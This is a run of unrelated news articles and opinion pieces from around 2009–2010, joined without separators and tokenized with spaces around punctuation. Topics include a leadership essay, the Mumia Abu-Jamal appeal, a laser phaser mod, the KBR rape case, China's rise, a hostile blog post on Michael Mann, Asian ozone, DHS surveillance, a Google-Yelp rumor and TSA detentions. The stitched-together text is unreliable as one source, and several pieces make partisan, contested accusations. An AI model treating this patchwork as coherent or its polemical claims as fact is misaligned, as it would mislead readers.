Leaders do n’t lead .
How did this particular skillset emerge ?
Influence counts because the vast , Kafkaesque bureaucracies that managed 20th century prosperity , created , in turn , the need for “ leaders ” : people who could navigate the endlessly twisting politics at the heart of such organizations , and so ensure their survival .
But leaders do n’t create great organizations — the organization creates the leader .
20th century economics created a canonical model of organization — and “ leadership ” was built to fit it .
Leadership can be a bad .
Organizations are just tools — and leaders are just more proficient users .
When would a tool need a more proficient user — a leader — most ?
When the opportunity cost is greatest : exactly when that tool is about to be outcompeted by a better tool .
Leaders are created when organizations are threatened to ensure organizational survival .
But sometimes organizational death is the optimal outcome .
That ’s exactly what we see in the real world : leaders unleashing bailout after bailout , horse - trade after horse - trade , to ensure the survival of yesterday ’s malfunctioning machines .
The economics suggest that 20th century leadership lets dysfunctional organizations thrive at the expense of prosperity .
Here ’s the problem in a nutshell .
What leaders “ lead ” are yesterday ’s organizations .
But yesterday ’s organizations — from carmakers , to investment banks , to the healthcare system , to the energy industry , to the Senate itself — are broken .
Today ’s biggest human challenge is n’t leading broken organizations slightly better .
It ’s building better organizations in the first place .
It is n’t about leadership : it ’s about “ buildership ” , or what I often refer to as Constructivism .
Leadership is the art of becoming , well , a leader .
Constructivism , in contrast , is the art of becoming a builder — of new institutions .
Like artistic Constructivism rejected “ art for art ’s sake , ” so economic Constructivism rejects leadership for the organization ’s sake — instead of for society’s .
Builders forge better building blocks to construct economies , polities , and societies .
They ’re the true prime movers , the fundamental causes of prosperity .
They build the institutions that create new kinds of leaders — as well as managers , workers , and customers .
Who ’s a Builder — and who ’s just a leader ?
Here are some Builders contrasted with mere leaders :
Mahatma Gandhi vs Barack Obama .
Keith Olbermann recently took Obama to task for “ a lack of leadership ” .
Yet , on the contrary , Obama ’s problem is that he ’s too much of a leader — and not enough a Builder .
He ’s mastered the principles of leadership ; the result is politics as usual , instead of political reform .
Gandhi , in contrast , was no mere leader , but the most awesome kind of Builder .
He built one of the most significant institutions in history : nonviolent resistance .
Obama ’s challenge is n’t just “ leading ” Congress , the Senate , or the Executive Branch , by horse - trading better — it ’s reforming them , to build something even 1/1000th as significant .
Nelson Mandela vs Sarah Palin .
Sarah Palin ’s shaping up to be a great political leader , expert at applying the tenets of leadership , for example , via Facebook , to divide , demolish , and conquer .
It is Mandela who is a Builder .
His crowning achievement , that altered the very fabric of politics , was a new institution for governance : South Africa ’s Truth and Reconciliation Commission .
Mohammad Yunus vs Ben Bernanke .
Time ’s person of the year , Ben Bernanke , bailed out yesterday ’s financial institutions with a vengeance .
What he did n’t do was build better ones — like Muhammad Yunus , the microfinancial pioneer , did .
Matt Taibbi & Nick Kristof vs Tom Friedman & Maureen Dowd .
Tom and MoDo are textbook examples of leaders in journalism ; churning out column after column that challenge the conventional wisdom and set the agenda .
Yet , that ’s not nearly enough to save journalism — let alone the New York Times .
Matt and Nick , in contrast , are ( re ) building the institution of journalism for the 21st century , by utilizing the power of the Internet to reconstruct relationships with readers , publishers , and sources .
Jacqueline Novogratz vs Wall Street .
Wall Street ’s leaders spearheaded an assault on staid banking as usual : the future , it was said , lay in slicing , dicing , and trading .
But they never built new institutions to ensure their trades were socially useful .
Jacqueline Novogratz did : her Acumen Fund is a new type of investor entirely , built from the ground up to invest for the common good .
Evan Williams vs Bill Gates .
Ev is n’t just a serial entrepreneur — he ’s a serial Builder .
First , he spearheaded the building not just of Blogger , the company , but of blogging , an entirely new medium .
Today , he ’s spearheading the creation not just of Twitter , the company , but of microblogging — yet another new medium .
Both are new institutions that have changed how the world interacts .
Bill Gates , in contrast , was just a leader .
He led just another run -of - the - mill corporation to yet another monopoly — a total black hole of Buildership .
Today , ironically enough , Gates is trying to redress the balance , by sparking a debate about how to ( wait for it ) build a better capitalism .
Elinor Ostrom vs Econ 101 .
Ostrom — winner of last year ’s Economics Nobel Prize — was n’t just a leading theorist , like , for example , Ben Bernanke .
While most leading economists improved canonical models , Ostrom built a new way to study econ : by hitting the field and understanding how people actually manage resources locally .
It was her methodology that led to her profound — and profoundly challenging — insights .
Today ’s builders are igniting the distant grandchild of yesterday ’s industrial revolution : an institutional revolution for a post - industrial world .
They are forging the new building blocks — from ethical investment , to deep journalism , to socially useful finance , to universally accessible communication — that a rusting economy , society , and polity so urgently demand .
The 21st century does n’t need more leaders – nor more leadership .
Only Builders can kickstart the chain reaction of a better , more authentic kind of prosperity .
How can you become one ?
Here are the ten principles of Constructivism ( contrasted with these principles of leadership ) .
The boss drives group members ; the leader coaches them .
The Builder learns from them .
The boss depends upon authority ; the leader on good will .
The Builder depends on good .
The boss inspires fear ; the leader inspires enthusiasm .
The Builder is inspired — by changing the world .
The boss says “ I ” ; the leader says “ we ” .
The Builder says “ all ” — people , communities , and society .
The boss assigns the task , the leader sets the pace .
The Builder sees the outcome .
The boss says , “ Get there on time ; ” the leader gets there ahead of time .
The Builder makes sure “ getting there ” matters .
The boss fixes the blame for the breakdown ; the leader fixes the breakdown .
The Builder prevents the breakdown .
The boss knows how ; the leader shows how .
The Builder shows why .
The boss makes work a drudgery ; the leader makes work a game .
The Builder organizes love , not work .
The boss says , “ Go ; ” the leader says , “ Let ’s go . ”
The Builder says : “ come . ”
They ’re not the only principles , and perhaps not even the best ones .
But they begin to help us think constructively about how to build a better tomorrow .
And that is , ultimately , what it ’s all about .
Builders put the “ Constructive ” in Constructive Capitalism .
Constructive does n’t just mean “ to improve on yesterday . ”
It also means “ to build for tomorrow . ”
So the question is this : are you merely managing an organization , just leading an organization — or are you building an institution ?
99.9 % of the world ’s leaders are , well , just leaders .
But today , leadership alone ca n’t get you from the 20th century to the 21st .
Of course , everyone has their own definition of leadership — and that ’s why it ’s a tricky subject to discuss .
The “ leadership ” I ’m challenging is of the orthodox , B - school 101 one , that has to do with motivation , influence , and power .
But your take on leadership might be closer to my definition of Constructivism .
Have a think about that before you comment .
And fire away with your own examples of Builders — or comments , thoughts , and questions .
PHILADELPHIA ( Reuters ) - The U.S. Supreme Court is expected on Tuesday to issue its latest decision on the fate of Mumia Abu - Jamal , arguably America ’s most famous death - row inmate , convicted of slaying a Philadelphia policeman , a crime he denies committing .
A demonstrator has " Free Mumia " painted on his sunglass lenses , outside the federal courthouse during the appeal of convicted murderer Mumia Abu Jamal in Philadelphia , Pennsylvania May 17 , 2007 .

The court is due to rule on an appeal by the Philadelphia district attorney who is seeking to have Abu - Jamal executed and bring an end to a decades - long legal saga the inmate , a former journalist , wrote about while in prison .
Abu - Jamal , now 55 , was convicted in 1982 of killing officer Daniel Faulkner on December 9 , 1981 .
He has become an international cause celebre for the anti-death penalty movement whose supporters argue strenuously he did not receive a fair trial .
His backers say he was framed by police , that prosecution witnesses were coerced into false testimony and that ballistics evidence shows Abu - Jamal did not shoot Faulkner but that the murder was committed by another man who fled the scene .
Supporters also claim that Abu - Jamal , who is black , was the victim of a racist and notoriously pro-prosecution trial judge , the now - deceased Albert Sabo , who was overheard to say , “ Yeah , and I ’m going to help them fry the nigger , ” according to an affidavit by a court stenographer .
Faulkner ’s widow , Maureen , and Philadelphia ’s Fraternal Order of Police oppose any clemency for Abu - Jamal , arguing his conviction has been upheld repeatedly by numerous courts , including the Supreme Court , over three decades .
They note that bullet fragments taken from Faulkner ’s body match the ammunition from the gun carried by Abu - Jamal who was earning his living as a taxi driver at the time of the killing .
If the Supreme Court rules in his favor , Abu - Jamal would get a new jury trial on the sentencing , but not his conviction .
But a defeat is likely to send the case back to an appeals court , whose ruling would be based on a new Supreme Court decision on jury instructions in another case , said his attorney , Robert R. Bryan .
Abu - Jamal has been in solitary confinement on death row since the conviction , and has been held since 1995 in a western Pennsylvania prison where he has written books and contributed to international journals and radio shows .
Outside the United States , Abu - Jamal ’s backers include the human rights group Amnesty International , which in 2000 called for a new trial , arguing his conviction and sentence followed “ contradictory and incomplete evidence ” in a trial that failed to meet minimum international standards of justice .
Here ’s another Star Trek phaser toy with a laser added .
[ Jay ] started with a 1994 Star Trek phaser and added a 12X Blu - Ray diode .
The sound effects of the toy still work , a nice touch that you can check out in the video after the break .
That video shows him popping balloons with the laser , a feat made possible by the 465 mW that it puts out when the diode is driven at 320 mA of current .
He ’s made a nice carrying case for the weapon but we did n’t see a spot in there for protective glasses like we ’ve seen with other phaser hacks .
He did make one safety consideration by adding a safety switch and indicator LED to signal when the laser diode is armed .
Mega defense contractor Kellogg , Brown , and Root is preparing to fight former employee Jamie Leigh Jones over her right to settle her suit with the company , all the way to the Supreme Court .
Its strategy ?
Destroying Jones ' credibility .
Jones is suing KBR for a painful and complicated reason - after she was drugged and allegedly gang - raped while working for the contractor , KBR chose to lock her in a shipping container rather than investigate the charges .
She eventually escaped , but is now forced to sue the company to release her from her employment agreement ( which requires arbitration of all disputes ) so that she can pursue a court - based solution .
KBR is already reeling from Senator Franken 's amendment ( which penalizes government contractors that force their employees to arbitrate claims of discrimination and sexual assault - a direct result of the Jones case ) , but far from being contrite , the decision against them in Circuit court appears to has strengthened their resolve to force Jones to do it the KBR way .
Slate reports :
The 5th Circuit , splitting 2 - 1 , examined KBR 's claim that Jones ' rape was " related to " her employment and conceded that other courts have been split on the issue .
The panel concluded , however , that the scope of the arbitration provision at issue " certainly stops at Jones ' bedroom door . "
It also ruled that if Halliburton / KBR had considered her gang rape a " distinct risk " of her employment , the company " would have immediately heeded Jones ' request to be placed in a private sleeping facility , instead of a barracks where the ratio of men to women was 20 to one . "
The panel agreed with the district court that for purposes of this litigation , " Plaintiff 's bedroom should [ not ] be considered the workplace , even though her housing was provided by her employer . "

While the decision was split , the justices have painted a clear picture of the issues involved in Jones ' case .
No matter how the evidence is examined , KBR is in many ways at fault for how the situation was handled .
In light of the unfavorable decision , the KBR legal team has decided to play hardball , using classic victim blaming tactics to shift the focus of the case .
In addition to going after her truthfulness in its court pleadings , KBR has mounted a zealous public campaign to " correct the facts " about the Jones litigation - urging , for instance , that " Ms. Jones ' allegation of rape remains unsubstantiated " and that she was n't locked in a shipping container but rather " provided with a secure living trailer . "
Apparently KBR fails to appreciate the irony of demanding that all of its counter - facts come to light despite its love for secret arbitration .

What KBR fails to mention is its part in ensuring the assault remained " unsubstantiated " - instead of investigating the claim seriously , they removed Jones and put her into some form of compound .
While KBR claims they provided the rape kit to the State Department , but did not provide a time frame for handover .
Nor do they explain why Jones was the employee removed and placed under guard .
Instead , KBR believes that relying on a classic strategy - discrediting the victim - will lead the Supreme Court to overlook their culpability in the situation .

The dynamics of President Obama ’s trip to China were markedly different from those evident on visits made by President Clinton and President George W. Bush .
This time the Chinese made clear that they were unwilling even to discuss issues such as human rights or free speech .
Why ?
The relationship between the countries has changed : America feels weak and China strong in their bilateral ties .
This is not a temporary shift that will reverse itself once the U.S. has escaped from its mountain of debt .
Rather , it is the expression of a deep and progressive shift in the balance of power between the two nations , one that is giving the Chinese -- though studiously cautious in their approach -- a rising sense of self - confidence .
Nor should we be surprised by the Chinese response .
They may have appeared more conciliatory on previous visits by American leaders , but that was largely decorative .
The Chinese have a powerful sense of their identity and worth .
They have never behaved toward the West in a supplicant manner , for reasons Westerners persistently fail to understand or grasp .
Ever since the Nixon - Mao rapprochement , and through the various iterations of the Sino - American relationship over the subsequent almost four decades , there has been an overriding belief in the West that eventually China would become like us : that , for example , a market economy would lead to democratization and that a free media was inevitable .
This hubristic outlook is deeply flawed , but it still prevails , albeit with small cracks of self - doubt starting to appear .
The issue here is much deeper than Western - style democracy , a free media or human rights .
China is simply not like the West and never will be .
There has been an underlying assumption that the process of modernization would inevitably lead to Westernization ; yet modernization is not just shaped by markets , competition and technology but by history and culture .
And Chinese history and culture are very different from that of any Western nation - state .

If we want to understand China , this must be our starting point .
The West ’s failure to understand the Chinese has repeatedly undermined its ability to anticipate their behavior .
Again and again , our predictions and beliefsabout China have proved wrong : that the Chinese Communist Party would fall after 1989 , that the country would divide , that its economic growth could not be sustained , that its growth figures were greatly exaggerated , that China was not sincere about its offer of “ one country two systems ” at the time of the hand - over of Hong Kong from Britain -- and , of course , that it would steadily Westernize .
We have a long track record of getting China wrong .
The fundamental reason for our inability to accurately predict China ’s future is our failure to understand its past .
Although China has described itself as a nation - state for the last century , it is in essence a civilization - state .
The longest continually existing polity in the world , it dates to 221 BC and the victory of the Qin. Unlike Western nation - states , China ’s sense of identity comes from its long history as a civilization - state .
Of course , there are many civilizations -- Western civilization is one example -- but China is the only civilization - state .
It is defined by its extraordinarily long history and also its huge geographic and demographic scale and diversity .
The implications are profound : Unity is its first priority , plurality the condition of its existence ( which is why China could offer Hong Kong “ one country two systems , ” a formula alien to a nation - state ) .

The Chinese state enjoys a very different kind of relationship with society compared with the Western state .
It enjoys much greater natural authority , legitimacy and respect , even though not a single vote is cast for the government .
The reason is that the state is seen by the Chinese as the guardian , custodian and embodiment of their civilization .
The duty of the state is to protect its unity .
The legitimacy of the state therefore lies deep in Chinese history .
This is utterly different from how the state is seen in Western societies .
If we are to understand China , we must move beyond the compass of Western reality and experience and the body of concepts that has grown up to explain that history .
We find this extremely difficult .
For 200 years the West , first in the shape of Europe and then the United States , has dominated the world and has not been required to understand others or The Other .
If need be it could always bully the latter into submission .
The emergence of China as a global power marks the end of that era .
We now have to deal with The Other -- in the form of China -- on increasingly equal terms .
China , moreover , is possessed , like the West , with its own form of universalism .
It long believed that it was “ the land under heaven , ” the center of the world , superior to all other cultures .
That sense of self , which has engendered a powerful self - confidence , has been persistently evident over the last 40 years , but with China ’s rise , it is becoming more apparent as the country ’s sense of achievement and restoration gains pace .
Or to put it another way , when the presidents of China and the United States meet in Beijing in 2019 , with the Chinese economy fast approaching the size of the American economy , we can be sure that the Chinese sense of hubris will be far stronger than in 2009 .

But long before that , we need to try and understand what China is and how it behaves .
If we do n’t , then relations between China and the United States will never move beyond the polite and the formal -- and that will be a bad omen for the future relationship between the two countries .

Guest post by John A
It ’s always a difficult place for me to deal with interviews with Michael Mann , because on previous occasions
Mann gets to say ridiculous things and get praised for them by fawning interviewers .
One of the great mysteries of climate science is why Mann never gets interviewed by an informed and intelligent interviewer in command of the facts – or maybe it is n’t such a mystery after all .
Today ’s journalistic pulpit was provided by “ Faye Flam ” and published on Philly.com
For openers , Mann has n’t lost his touch for the paranoid conspiracy theory :
Though he has been accused of dodging the press , Mann , 44 , agreed readily to an interview on a bitterly cold day last week .
The campus was deserted , as almost everyone was away for winter break .
Mann was affable and calm as he answered the assertions of his critics .
The hardest part for him , he said , is having his integrity questioned .
Scientists , he said , are “ not trained to deal with these kinds of attacks . ”
“ My suspicion is , this has been orchestrated at a high level , ” he said of the hacking .
What ?
Where ?
This is Michael Mann , famous for questioning the integrity of others ( especially if their surname begins with “ Mc ” ) in the most lurid terms yet when he ’s caught out orchestrating boycotts of scientific journals , journalists and scientists who dare peek at his data and methodology , undermining and subverting the whole scientific process , it ’s all a big conspiracy .
Now I have to reach for the Mylanta :
Mann points out that the hockey stick is not widely seen as a smoking gun implicating human activity in global warming .
And it was not the giant graph used in Al Gore ’s An Inconvenient Truth .
That was a graph of the carbon dioxide component of our atmosphere – which also is rising sharply .
Erm .
The Hockey Stick was shown on AIT but misrepresented by Gore as “ Dr Thompson ’s Thermometer ” .
All of this was worked out in November 2007 on Climate Audit but for some reason “ Faye Flam ” ca n’t get a clue .
What do you expect from journalists ?
Background research ?
Basic checking ?
Here ’s Steve McIntyre ’s replication of the AIT graph using the Hockey Stick , the CRU temperature record and some free software :
Look similar , Faye ?
Another gulp of antacid , please :
The paper that contained the first hockey stick appeared in 1998 , with a more complete reconstruction in 1999 .
Mann said he was surprised it got so much news coverage .
After the first paper , he said , he was asked by the Clinton administration to advise the president on climate change for the 1999 State of the Union address .
He was just shocked , shocked when he phone started ringing off the hook .
Yeah , right .
That ’s when Mann said he realized the hockey stick had taken on a life of its own .
In 2006 , U.S. Rep. Joe Barton ( R. , Texas ) , a global - warming skeptic , commissioned an investigation into the hockey stick papers , led by statistician Edward Wegman of George Mason University .
Woah !
Woah Faye !
Back off a little !
In between 1999 and 2006 Mann was Lead Author of the key chapter on paleoclimate of the IPCC Third Assessment Report which featured the Hockey Stick no less than SIX TIMES .
Why is he surprised at the reaction to the Hockey Stick , Faye ?
Helloooo ?
Wegman said Mann made a mistake in the way he centered the data in the graph .
He suggested that Mann and his colleagues were brash young researchers who should have gotten more help on their math .
Now here ’s where I get most annoyed – the willingness of journalists to selectively misquote and misrepresent historical documents or allow their interviewees to misrepresent them .
Nowhere did Wegman suggest that the Hockey Team were “ brash young researchers who should have gotten more help with their math ” .
What he actually said and put into the Congressional record was this :
While the work of Michael Mann and colleagues presents what appears to be compelling evidence of global temperature change , the criticisms of McIntyre and McKitrick , as well as those of other authors mentioned are indeed valid .
“ Where we have commonality , I believe our report and the [ NAS ] panel essentially agree .
We believe that our discussion together with the discussion from the NRC report should take the ‘ centering ’ issue off the table .
[ Mann ’s ] decentred methodology is simply incorrect mathematics ….
I am baffled by the claim that the incorrect method does n’t matter because the answer is correct anyway .
Method Wrong + Answer Correct = Bad Science .
and furthermore Wegman ’s Team did a stand - up job showing that the peer - review process was likely to have been short - circuited :
It is important to note the isolation of the paleoclimate community ; even though they rely heavily on statistical methods they do not seem to be interacting with the statistical community .
Additionally , we judge that the sharing of research materials , data and results was haphazardly and grudgingly done .
In this case we judge that there was too much reliance on peer review , which was not necessarily independent .
Of course , now we know that such short - circuiting was entirely deliberate – it was subverted by Mann and his friends in Rocky Mountain High places .
Did you read the emails , Faye ?
No .
Mann ’s friends certainly like to rally to the cause , demonstrating that some people have no shame :
A different picture is painted by statistician Douglas Nychka , who examined Mann ’s work as part of a similar panel assembled by the National Academy of Sciences , also in 2006 .
“ There are some things that he could have done better , but there ’s no fatal flaw , ” said Nychka .
“ There ’s nothing that would make you discount the whole analysis . ”
Hey Doug !
Did you read the Wegman Report ?
He said the Mann Analysis was “ bad science ” and “ incorrect mathematics ” so which part of that did n’t you understand ?
Nychka , who works for the National Center for Atmospheric Research in Boulder , Colo. , said the paper became so controversial because it was misinterpreted as proof that humans cause global warming .
Now , where did we get that idea ?
Who could have misinterpreted it and why did n’t Mann warn them ?
Think , think …
And Nychka manages to re-saddle several hobby - horses and send them stampeding :
Nychka said he would like to see Wegman and Mann ’s other critics create their own graphs of past climates : “ Why do n’t they come back with a positive contribution , put some alternative forward ? ”
Of course , spotting that Mann misused statistics in a horrible way cannot be seen as positive – positive for the integrity of the scientific method , yes – but not positive by people surprised at the publicity of their own badly calculated statistical nonsense portrayed over and over .
I wonder if Hwang woo Suk tried that line with the bloggers who exposed his lies – did he ask them to produce their own stem cell lines before they could criticise him ?
But I digress …
The data are all easily available at several sites , said Nychka .
Mann , for example , has posted his data leading to the “ hockey stick ” online through the National Climatic Data Center .
Yes , NOW the data is online .
But the methodology and the identification of that data certainly was n’t because Mann claimed that as his personal property and it took a Congressional Committee to pry it from him .
But then you did n’t do any of the background did you Faye ?
Since 1998 , other people have made their own “ paleoclimate ” reconstructions .
Putting those together , the National Academy report in 2006 created what has been called the spaghetti plot – a chart that superimposes different researchers ’ graphs of global temperatures over the last 1,000 years .
The spaghetti strands curve up and down , but all rise dramatically in the 20th century .
The overall pattern , notes Nychka , is the same .
I think we should let Wegman shoot this lame nag through the head :
Based on the literature we have reviewed , there is no overarching consensus on [ Mann ’s work ] .
As analyzed in our social network , there is a tightly knit group of individuals who passionately believe in their thesis .
However , our perception is that this group has a self - reinforcing feedback mechanism and , moreover , the work has been sufficiently politicized that they can hardly reassess their public positions without losing credibility .
It is clear that many of the proxies are re-used in most of the papers .
It is not surprising that the papers would obtain similar results and so cannot really claim to be independent verifications .
Different researchers , but all of them connected directly to Mann and used the same proxies over and over .
It ’s not independence as we know it , Doug .
And then to Climategate .
Faye is obviously well out of her depth and sinking fast
Mann recalls a Friday night when a colleague alerted him that the hackers had tried to expose the e-mails on RealClimate , the blog he founded with another climatologist .
Over the ensuing weeks , pundits have shifted their focus from one set of e-mail exchanges to another , dubbing the issue “ climategate . ”
First , the spotlight shone on an exchange between two other researchers referring to a “ trick ” Mann had used in plotting his data .
But not even Mann ’s critics can cite any evidence of deception in the now doubly investigated hockey stick papers .
The term trick , said Mann , described a technique he used to display his data .
Again this fascination with deception , but I ’m willing to bet this is Mann misrepresenting what actually happened with a journalist too lazy to check facts .
Other pundits criticized Mann and colleagues for agreeing to shun the journal Climate Research after it published work by climate - change skeptics .
Mann said the particular article was bad science and was “ polluting ” the journal .
Pundits , Faye ?
They were scientists including the editor of the journal .
The article finishes with a tear - jerker :
There is still much debate over how big a role human activity plays in the current warming trend , and how the future will be affected .
Climate science – and earth science in general – is not expected to make the kinds of sharp predictions that chemists and physicists can make with repeated experiments .
“ It would be nice if we could do controlled experiments , ” Mann said .
“ But we have only one Earth . ”
Yes , and all of these nasty questions make baby Jesus cry .
I wonder why newspapers are sinking fast into the mud of history and then Faye Flam arrives to remove the wonder .

SPIEGEL Interview with Pakistan's Prime Minister ' American Drone Attacks Are Counterproductive '
In a SPIEGEL interview , Pakistani Prime Minister Yousuf Raza Gilani talks about the fight against terrorism in his country , the future of Afghanistan and why US drone attacks do more harm than good .
Ozone from Asia is wafting across the Pacific on springtime winds and boosting the amount of the smog - producing gas found in the skies above the Western United States , researchers said in a study released Wednesday .
The study , published in the journal Nature , looks at a phenomenon that has puzzled scientists in the last decade : Ground - level ozone has dropped in cities thanks to tighter pollution controls ; but it has risen in rural areas in the Western U.S. , where there is little industry or automobile traffic .
The study , led by Owen R. Cooper , an atmospheric scientist at the University of Colorado , examined nearly 100,000 observations two to five miles above ground -- in a region known as the free troposphere -- gathered from aircraft , balloons and ground - based lasers .
It found that baseline ozone -- the amount of gas not produced by local vehicles and industries -- has increased in springtime months by 29 % since 1984 .

The study has important implications both for the curbing of conventional pollution that damages human health and for controlling greenhouse gases that are changing the planet ’s climate , experts said .
It shows the need for a transformation of global energy and transportation systems , said Mary Nichols , chairwoman of the California Air Resources Board .
“ Atmospheric scientists keep finding more evidence that pollutants travel around the globe and move up and down as they travel , ” she said .
“ There is not a bright line separating greenhouse gases from regular air pollution . ”
The study , co-written by researchers from nine institutes in the U.S. and abroad , is only a first step in understanding cross - border pollution , Cooper said .
More research will be needed to investigate how much of the ozone from the troposphere reaches the ground and how much flows across borders at other times of the year .
The researchers began with the free troposphere because it is easier to eliminate local sources from baseline ozone calculations .

They chose April and May because that is when winds from Asia are strongest .
“ Ozone is a difficult gas to pin down , ” said Cooper , who works at the Earth System Research Laboratory of the National Oceanic and Atmospheric Administration in Boulder , Colo .
“ The study of intercontinental air pollution has been going on for a decade , but whether it was increasing overall was uncertain .
“ And in places where it had spiked , along coasts and in national parks , we did n’t know how much was from local sources and how much was from Asia . ”
Cooper said scientists had not determined how much of the ozone increase comes from Asia , but they found that the increase was about twice as much when prevailing winds came from South and East Asia .
( Emissions of nitrogen oxides , a key ingredient for ozone formation , have increased more than 50 % in China over the last decade while decreasing in the U.S. and Europe . )
Advertisement
Still , the study offers “ the most conclusive evidence so far of increasing ozone levels in the free troposphere over North America , ” wrote atmospheric chemist Kathy Law , an expert in long - range pollution transport , in a Nature commentary on the paper .
Moreover , she added , the increases “ certainly have implications for climate change , causing warming either at the mid-latitudes where ozone forms , or in sensitive regions such as the Arctic to which ozone might be transported . ”
According to the Environmental Protection Agency , ground - level ozone is linked to serious health problems , including aggravation of asthma and increased risk of premature death in people with heart or lung disease .
In Southern California , which has some of the highest pollution levels in the U.S. , smog levels exceed health standards more than 80 days a year .
Based on new studies , the EPA announced this month that it may tighten federal ozone rules .

WASHINGTON  In February , a Department of Homeland Security intelligence official wrote a “ threat assessment ” for the police in Wisconsin about a demonstration involving local pro- and anti-abortion rights groups .
That report soon drew internal criticism because the groups “ posed no threat to homeland security , ” according to a department memorandum released on Wednesday in connection with a Freedom of Information Act lawsuit .
The agency destroyed all its copies of the report and gave the author remedial training .
That was just one of several cases in the last several years in which the department ’s intelligence office improperly collected information about American citizens or lawful United States residents , the documents show .
In March 2008 , the office produced a “ terrorism watch list ” report about a Muslim conference in Georgia at which several Americans were scheduled to speak , even though it “ did not have any evidence the conference or the speakers promoted radical extremism or terrorist activity , ” and such speech is constitutionally protected , an internal report said .
It is the only major piece of social policy legislation in American history that has no bipartisan support , and no popular support .
Even the hard Left hates it .
The Senate bill was crafted in secret , behind closed doors , where it remains .
It required defacto bribes of two Democrats in exchange for their votes .
Only a handful in the Senate have read it , but 60 vote for it .
And yet , this corrupt piece of legislation , jammed down the throats of Americans who do n’t want it , may well become the law of the land by January .
Amazing .
Hail Pyrrhus .

What a Google - Yelp Deal Would Mean …
Hat tip to Ben Saren of Citysquares , who called me this morning before I ’d even had a chance to check my feed reader !
Greg Sterling relayed a TechCrunch story late last night on Search Engine Land saying that Google is in “ advanced acquisition negotiations ” to buy Yelp .
It looks like Matt Booth of the Kelsey Group ’s quick math at last week ’s ILM 09 show was inline with Yelp ’s own hints — $ 45 MM – $ 50 MM in revenues this year .
The deal is rumored at $ 500 MM .
From an Industry Perspective
I ’m not a VC expert by any means but my two cents is
that seems like a nice ROI but not amazing and
it seems like Google is getting an absolute bargain , given the multi-multi- billion dollar opportunity that Local represents over the next 5 - 10 years .
From Google ’s point of view , it ’s an anti-competitive buy .
Yelp has a passionate base of users that I do n’t think Google ’s sterile , lily - white brand is ever going to be able to engender on Google.com .
Yelp is absolutely becoming a destination site for Local among people in my generation ( and apparently , even in Mike Blumenthal ’s ) .
When we ’re trying to discover a new business to visit , we often do n’t even think about using Google–we ’ll go straight to Yelp .
It ’s a major problem for Google that they were starting to lose the Local destination game and they wanted to nip the threat in the bud .
Oh and by the way , Yelp ’s category pages tend to rank in the top 10 organic results on Google for most locally - targeted queries anyway .
From Yelp ’s point of view , I think it ’s smart to sell while the company is still on the rise – the graveyard of web 2.0 companies have failed to sell at the right time is vast–although I ’m surprised the valuation was n’t higher .
It ’s a bit of a blow to the other players in the industry that Google is essentially cornering the market on user reviews to - date .
But at the same time , there ’s already a rising anti-Google sentiment among search marketers and techies that Google controls too much information , and that may affect some active Yelpers as well , and encourage them to start building their profile elsewhere on more independent players .
I do n’t really see any pure IYP ’s jumping into the vaccuum ( again , thanks to Ben for that word ) because they , like Google , do n’t have the brands to be able to resonate on an emotional level with users .
But players like FourSquare , UrbanSpoon , Citysearch , JudysBook , etc. , I think might actually welcome this move as an opportunity to build a contrarian brand .
From a revenue standpoint , it ’ll be more important than ever for these kinds guys to form alliances as a way to say to small business owners “ Look , Google / Yelp are 40 % of the market ; collectively WE’RE 40 % of the market as well . ”
Particularly forming consortiums among brands that have developed vertical respect like UrbanSpoon , Boorah , Zagat ’s etc .
From a Small Business Perspective
Initially my thought was that any deal that made this ecosystem a little simpler would be a good thing from the perspective of the SMB .
Provided there is some sort of integration between the LBC and Yelp for Business Owners , that should make the whole claiming / submitting / verifying process considerably simpler .
But , many of my clients already want to put all of their eggs in the Google basket , and that is just not a healthy business model .
How much further would a Gelp ( Yoogle ? ) partnership skew that kind of thinking .
Additionally , ad buys on such a powerful network where every small business owner is competing are going to get prohibitively expensive for some SMB ’s at some point … and they ’ll need a cheaper alternative that actually brings them a positive ROI at some mid-term point in the future .

“ No country has ever treated me so badly , not China .
Not Vietnam .
Not Afghanistan . ”
Paul Joseph Watson
Prison Planet.com
Wednesday , January 6 , 2010
A war reporter who was detained , interrogated and handcuffed at Seattle airport for refusing to answer personal questions about his income has warned that Americans need to start standing up to TSA thugs because entering the country is now a more stifling experience than some of the worst police states on the planet .
“ No country has ever treated me so badly , ” Michael Yon wrote in a Facebook message .
“ Not China .
Not Vietnam .
Not Afghanistan .
Definitely not Singapore or India or Nepal or Germany , not Brunei , not Indonesia , or Malaysia , or Kuwait or Qatar or United Arab Emirates .
No county has treated me with the disrespect can that can be expected from our border bullies . ”
“ Yon was taken aside by the TSA and asked a series of questions , many of which seemed to have no bearing on national security .
Finally when asked what his personal income was , he refused to answer because he felt it was none of their business .
At this point they handcuffed and detained him until he was eventually released by Port Authority police because the TSA had no legitimate grounds to hold him , ” reports Blog Critics .
Yon said that his experience was par for the course when entering America and not a manifestation of the Christmas Day attack .
He told Breitbart.tv about a similar experience endured by his friend who was forced to give TSA agents her email password , who then proceeded to read her emails while she was in security .
Yon said he decided to stand up for his rights and “ stare down ” the TSA thugs .
“ I was like , let ’s go to jail .
I ’m ready , because I ’m not going to answer these questions , nobody ’s getting my passwords , ” he said , adding that he “ hoped an adult would enter the room ” so that he could be released .
A d v e r t i s e m e n t
Yon said that it was a nonsense that Americans were putting up with this kind of harassment .
“ We only have to deal with this because we put up with it ….it ’s incredible what we will allow our government to put us through , ” he said , adding that harassment at American airports was even worse than that he had encountered in Israel .
“ If we do n’t stand up to them they will continue to infringe on our rights , ” Yon warned .
Yon ’s experience was similar to that endured by Steve Bierfeldt , a Ron Paul Campaign For Liberty treasurer , who was hounded and harassed by TSA agents for the crime of carrying cash and Ron Paul campaign material .
( ARTICLE CONTINUES BELOW )
Bierfeldt was interrogated for over half an hour about his personal life and political viewpoints after he passed a metal box containing cash through a security checkpoint X-ray .
“ I do not believe I should give up my constitutional rights each time I choose to travel by plane .
I was doing nothing illegal or suspicious , yet I was treated like a potential criminal and harassed for no reason , ” said Bierfeldt .
The ACLU fired a lawsuit on behalf of Bierfeldt , arguing that , “ The Transportation Security Administration ( TSA ) is subjecting innocent Americans to unreasonable searches and detentions that violate the Constitution . ”
Incidents of TSA agents behaving like secret political police and embarking on petty power trips to harass innocent people have exploded way out of control and it has to stop now .
Even overlooking the primary issues of gross violations of rights and privacy , the fact is that a large number of people have simply refused to travel to America anymore because entering the country is like trying to get into the old East Germany .
This is killing the tourism industry and costing hundreds of millions of dollars each year .
A 2006 investigation by the Discover America Partnership found that tourism to America had sunk due to “ a climate of fear and frustration that is turning away foreign business and leisure travelers from visiting the United States and damaging America ’s image abroad . ”
